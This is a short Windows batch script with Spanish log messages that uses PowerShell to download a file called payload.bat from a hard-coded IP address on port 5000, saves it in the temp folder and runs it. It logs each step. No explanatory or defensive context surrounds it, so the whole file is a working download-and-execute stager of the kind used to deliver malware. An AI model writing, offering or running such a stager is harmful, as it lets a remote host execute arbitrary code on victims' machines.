@echo off
setlocal

set BASE=http://82.29.153.101:5000
set FILE=%temp%\payload.bat
set LOG=%temp%\client.log

echo [INFO] Descargando payload... > "%LOG%"

powershell -NoP -Command ^
"(Invoke-WebRequest '%BASE%/payload.bat' -UseBasicParsing).Content | Out-File -Encoding ASCII '%FILE%'"

if not exist "%FILE%" (
    echo [ERROR] No se pudo descargar >> "%LOG%"
    exit /b
)

echo [INFO] Ejecutando... >> "%LOG%"

call "%FILE%"

echo [OK] Ejecutado >> "%LOG%"